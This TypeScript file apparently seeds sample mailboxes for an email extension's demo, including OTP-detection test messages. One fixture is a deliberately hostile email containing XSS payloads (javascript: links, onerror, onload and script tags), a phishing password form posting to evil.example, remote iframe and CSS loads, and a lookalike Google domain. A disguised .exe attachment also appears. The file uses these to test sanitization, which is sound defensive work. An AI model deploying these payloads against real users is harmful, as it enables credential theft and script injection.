// Deterministic sample mailboxes for the standalone demo preview. Not shipped in the extension build.
import type { FakeGmail } from "@/testing/fakeGmail";

export const DEMO_ACCOUNTS = ["alex.rivera@gmail.com", "alex@northwind.example"] as const;

const PNG = Uint8Array.from(atob("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="), (c) => c.charCodeAt(0));
const enc = (s: string): Uint8Array => new TextEncoder().encode(s);
const H = 3_600_000;

const NEWSLETTER = `<table width="100%" cellpadding="0" cellspacing="0" style="background:#f3f0e8"><tr><td align="center" style="padding:16px">
<table width="560" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:8px;font-family:Georgia,serif;color:#222">
<tr><td style="padding:24px 28px 8px"><h1 style="margin:0;font-size:22px">The Weekly Dovetail</h1><p style="color:#666;margin:4px 0 0">Craft, tools &amp; slow software</p></td></tr>
<tr><td><img src="https://images.example.com/hero.jpg" width="560" height="180" alt="[Hero image: a workbench]" style="display:block;background:#e8e2d0"></td></tr>
<tr><td style="padding:20px 28px"><p>This week: how a 2,000-year-old joint inspired our new sync engine, plus five chisels worth owning.</p>
<p><a href="https://example.com/read-more" style="background:#1f5f4f;color:#fff;padding:10px 18px;border-radius:6px;text-decoration:none;display:inline-block">Read the issue</a></p></td></tr>
<tr><td style="padding:0 28px 24px;color:#888;font-size:12px">You are receiving this because you subscribed. <a href="https://example.com/unsubscribe">Unsubscribe</a><img src="https://tracker.example.com/open.gif?u=12345" width="1" height="1" alt=""></td></tr>
</table></td></tr></table>`;

const HOSTILE = `<h2 style="font-family:sans-serif">Your account has been locked</h2>
<p>Dear customer, <a href="javascript:alert('xss-link')">click here to verify</a> or <a href="https://accounts.google.com.secure-login.example/verify">verify at accounts.google.com</a>.</p>
<img src="x" onerror="alert('xss-onerror')">
<script>alert('script executed')</script>
<form action="https://evil.example/steal" method="post"><input name="password" type="password" placeholder="Password"><button>Sign in</button></form>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;font-size:30px">FAKE FULL-SCREEN OVERLAY</div>
<iframe src="https://evil.example/frame"></iframe>
<style>@import url(https://evil.example/x.css); body{background:url(https://evil.example/track.gif)}</style>
<svg onload="alert('svg')"><script>alert(1)</script></svg>
<img src="https://tracker.example.com/pixel.gif?uid=12345" width="1" height="1">
<p style="color:#555">If you can read this paragraph and nothing above executed, the sanitizer and sandbox did their job.</p>`;

export function seedDemo(fake: FakeGmail, now: number): void {
  const [home, work] = DEMO_ACCOUNTS;

  // ---- Home account ----
  const t = fake.addMessage(home, {
    from: "Maya Chen <maya.chen@studio.example>",
    to: home,
    subject: "Re: Offsite plan — venue shortlist",
    text: "I'd go with the lakeside option.\n\nThe pricing works out to about 15% under budget and there's a quiet room for the workshop.",
    date: now - 2 * H,
    labels: ["INBOX", "UNREAD", "IMPORTANT"],
  });
  fake.addMessage(home, {
    from: "Alex Rivera <alex.rivera@gmail.com>",
    to: "Maya Chen <maya.chen@studio.example>, Jon Park <jon@studio.example>",
    subject: "Offsite plan — venue shortlist",
    text: "Here are the three venues I shortlisted:\n1. Lakeside Lodge\n2. Old Mill\n3. City Loft\n\nThoughts?",
    date: now - 26 * H,
    labels: ["SENT"],
    threadId: t.threadId,
  });
  fake.addMessage(home, {
    from: "Jon Park <jon@studio.example>",
    to: home,
    subject: "Re: Offsite plan — venue shortlist",
    text: "Old Mill has better transit links, but Lakeside is nicer. Happy either way.",
    date: now - 20 * H,
    labels: ["INBOX"],
    threadId: t.threadId,
  });
  fake.addMessage(home, {
    from: "Maya Chen <maya.chen@studio.example>",
    to: home,
    subject: "Re: Offsite plan — venue shortlist",
    text: "Replying to everyone: I'd go with the lakeside option.\n\nThe pricing works out to about 15% under budget and there's a quiet room for the workshop.",
    date: now - 2 * H,
    labels: ["INBOX", "UNREAD", "IMPORTANT"],
    threadId: t.threadId,
  });

  fake.addMessage(home, {
    from: "Northwind Billing <billing@northwind.example>",
    to: home,
    subject: "Your invoice INV-2048 is ready",
    html: `<p>Hello Alex,</p><p>Your invoice for <b>June</b> is attached. Amount due: <b>€48.00</b> by 30 June.</p><p>Thanks,<br>Northwind Billing</p>`,
    text: "Your invoice for June is attached.",
    date: now - 4 * H,
    labels: ["INBOX", "UNREAD", "STARRED"],
    attachments: [
      { filename: "INV-2048.pdf", mimeType: "application/pdf", data: enc("%PDF-1.4 demo") },
      { filename: "statement.pdf.exe", mimeType: "application/octet-stream", data: enc("MZ not really") },
    ],
  });
  fake.addMessage(home, {
    from: "The Weekly Dovetail <news@dovetail-weekly.example>",
    to: home,
    subject: "Five chisels worth owning (and one to skip)",
    html: NEWSLETTER,
    text: "The Weekly Dovetail — read online.",
    date: now - 6 * H,
    labels: ["INBOX", "UNREAD", "CATEGORY_PROMOTIONS"],
  });
  fake.addMessage(home, {
    from: "Security Team <security@paypa1-support.example>",
    to: home,
    subject: "⚠ Security test: a deliberately hostile email",
    html: HOSTILE,
    text: "hostile",
    date: now - 7 * H,
    labels: ["INBOX", "UNREAD"],
  });
  fake.addMessage(home, {
    from: "ليلى حداد <layla@example.org>",
    to: home,
    subject: "دعوة إلى العشاء يوم الجمعة",
    html: `<div dir="rtl" style="font-size:16px"><p>مرحباً أليكس،</p><p>هل أنت متاح للعشاء يوم الجمعة؟ سنلتقي في الساعة الثامنة مساءً.</p><p>— ليلى</p></div>`,
    text: "مرحباً أليكس",
    date: now - 9 * H,
    labels: ["INBOX", "UNREAD"],
  });
  fake.addMessage(home, {
    from: "田中 健 <ken.tanaka@example.jp>",
    to: home,
    subject: "来週の打ち合わせについて",
    text: "アレックスさん、\n\n来週の火曜日、午後3時からの打ち合わせは可能でしょうか。資料は事前に共有します。\n\nよろしくお願いします。\n田中",
    date: now - 30 * H,
    labels: ["INBOX"],
  });
  fake.addMessage(home, {
    from: "Priya Nair <priya@example.com>",
    to: home,
    subject: "Photos from the weekend",
    html: `<p>Look at this view!</p><img src="cid:photo1" width="120" alt="weekend photo" style="border-radius:8px">`,
    text: "Look at this view!",
    date: now - 50 * H,
    labels: ["INBOX", "STARRED"],
    attachments: [{ filename: "photo1.png", mimeType: "image/png", data: PNG, inlineCid: "photo1" }],
  });
  fake.addMessage(home, {
    from: "GitHub <noreply@github.example>",
    to: home,
    subject: "[dovetail] Pull request #42 merged",
    text: 'Your pull request "Incremental history sync" was merged into main.',
    date: now - 55 * H,
    labels: ["INBOX", "CATEGORY_UPDATES"],
  });
  fake.addMessage(home, {
    from: "Sam Okafor <sam@example.com>",
    to: home,
    subject: "Lunch Thursday?",
    text: "Free Thursday around 12:30? There's a new ramen place near the office.",
    date: now - 72 * H,
    labels: ["INBOX"],
  });
  fake.addMessage(home, {
    from: "Travel Desk <trips@airline.example>",
    to: home,
    subject: "Your boarding pass for LH 1042",
    text: "Check-in is open. Gate information will be sent 40 minutes before departure.",
    date: now - 100 * H,
    labels: ["INBOX", "Label_2"],
    attachments: [{ filename: "boarding-pass.pdf", mimeType: "application/pdf", data: enc("%PDF-1.4 demo") }],
  });

  // ---- OTP demo messages (verification-code detection) ----
  fake.addMessage(home, {
    from: "Google <no-reply@accounts.google.com>",
    to: home,
    subject: "Your verification code",
    html: `<p>Hi Alex,</p><p>Your Google verification code is:</p><p style="font-size:28px;font-weight:700;letter-spacing:4px">482 193</p><p>This code expires in 10 minutes. Never share it with anyone.</p>`,
    text: "Hi Alex,\n\nYour Google verification code is 482 193. This code expires in 10 minutes. Never share it with anyone.",
    date: now - 25 * 60_000,
    labels: ["INBOX", "UNREAD"],
  });
  fake.addMessage(home, {
    from: "دیجی‌کالا <noreply@digikala.example>",
    to: home,
    subject: "کد تایید ورود",
    html: `<div dir="rtl"><p>سلام،</p><p>کد تایید شما: <b>۷۳۵۲۱۴</b></p><p>این کد تا ۵ دقیقه معتبر است. آن را با کسی به اشتراک نگذارید.</p></div>`,
    text: "سلام، کد تایید شما: ۷۳۵۲۱۴. این کد تا ۵ دقیقه معتبر است.",
    date: now - 40 * 60_000,
    labels: ["INBOX", "UNREAD"],
  });
  fake.addMessage(home, {
    from: "GitHub <noreply@github.example>",
    to: home,
    subject: "Two-factor authentication: A1B2C3",
    text: "Hey there!\n\nUse this one-time password to finish signing in to GitHub:\n\nA1B2C3\n\nThe code expires in 5 minutes.",
    date: now - 3 * H,
    labels: ["INBOX", "UNREAD"],
  });
  // Negative demo: a marketing email whose "code" is a discount coupon — must NOT get an OTP chip.
  fake.addMessage(home, {
    from: "ShoeMart <deals@shoemart.example>",
    to: home,
    subject: "40% off everything this weekend",
    html: `<p>Weekend sale!</p><p>Use discount code <b>SAVE40</b> at checkout for 40% off your entire order.</p><p>Offer ends Sunday.</p>`,
    text: "Weekend sale! Use discount code SAVE40 at checkout for 40% off your entire order.",
    date: now - 5 * H,
    labels: ["INBOX", "UNREAD", "CATEGORY_PROMOTIONS"],
  });

  // ---- Work account ----
  fake.addMessage(work, {
    from: "Dana Whitfield <dana@northwind.example>",
    to: work,
    subject: "Q3 roadmap review — slides attached",
    text: "Hi Alex,\n\nAttaching the draft slides for Thursday's roadmap review. Please add your section on the sync architecture by Wednesday noon.\n\nThanks,\nDana",
    date: now - 1 * H,
    labels: ["INBOX", "UNREAD", "IMPORTANT"],
    attachments: [{ filename: "Q3-roadmap.pdf", mimeType: "application/pdf", data: enc("%PDF-1.4 demo") }],
  });
  fake.addMessage(work, {
    from: "IT Helpdesk <helpdesk@northwind.example>",
    to: work,
    subject: "Scheduled maintenance this Saturday",
    text: "The mail gateway will be offline from 02:00 to 04:00 UTC on Saturday.",
    date: now - 5 * H,
    labels: ["INBOX", "UNREAD"],
  });
  fake.addMessage(work, {
    from: "Lee Morgan <lee@northwind.example>",
    to: work,
    subject: "Can you review PR #118?",
    text: "Small change to the notification dedupe logic. Would appreciate a second pair of eyes before EOD.",
    date: now - 8 * H,
    labels: ["INBOX", "UNREAD"],
  });
  fake.addMessage(work, {
    from: "Finance <finance@northwind.example>",
    to: work,
    subject: "Expense report approved",
    text: "Your expense report ER-5521 was approved and will be paid in the next cycle.",
    date: now - 28 * H,
    labels: ["INBOX"],
  });
  fake.addMessage(work, {
    from: "Recruiting <jobs@northwind.example>",
    to: work,
    subject: "Interview feedback needed: Senior Engineer",
    text: "Please submit your feedback for yesterday's interview in the hiring portal.",
    date: now - 40 * H,
    labels: ["INBOX", "STARRED"],
  });
}

export const INCOMING: { from: string; subject: string; text: string }[] = [
  { from: "Maya Chen <maya.chen@studio.example>", subject: "Quick question about the venue", text: "Do you have the contract handy? Lakeside needs a signature today." },
  { from: "Sam Okafor <sam@example.com>", subject: "Ramen at 12:30 works", text: "Booked a table for two. See you Thursday!" },
  { from: "Dana Whitfield <dana@northwind.example>", subject: "Moved: roadmap review to 3pm", text: "Heads up — the review moved to 3pm. Same room." },
  // OTP positives: exercise the full detect → cache → chip → copy pipeline in the demo/e2e.
  {
    from: "Google <no-reply@accounts.google.com>",
    subject: "Your verification code",
    text: "Your Google verification code is 640182. It expires in 10 minutes. Never share it with anyone.",
  },
  // OTP negative: a coupon that must NOT get a copy chip.
  { from: "ShoeMart <deals@shoemart.example>", subject: "Weekend sale inside", text: "Use discount code 640182 for 40% off this weekend only!" },
];
